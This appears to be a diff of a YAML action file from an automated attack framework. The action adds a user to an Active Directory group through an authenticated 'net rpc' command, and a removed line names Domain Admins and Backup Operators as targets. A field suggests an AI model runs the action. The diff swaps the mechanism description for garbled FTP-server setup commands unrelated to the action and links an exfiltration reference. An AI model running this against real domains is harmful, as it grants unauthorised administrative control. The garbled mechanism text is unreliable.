@@ -2,16 +2,20 @@ name: groupadd
 category: ad
 description: Add user to AD group
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "net rpc group addmem '{group}' '{username}' -U '{domain}/{admin_user}%{password}' -S {target_ip}"
+command_template: net rpc group addmem '{group}' '{username}' -U '{domain}/{admin_user}%{password}'
+  -S {target_ip}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Adds user to group. Requires GenericAll/GenericWrite on group object. Key targets: Domain Admins, Remote Management Users, Backup Operators."
+mechanism: apt-get update && apt-get install pure-ftp groupadd ftpgroup useradd -g
+  ftpgroup -d /dev/null -s /etc ftpuser pure-pwd useradd fusr -u ftpuser -d /ftphome
+  pure-pw mkdb cd /etc/pure-ftpd/auth/ ln -s ..
+hacktricks_ref: generic-hacking/exfiltration.md
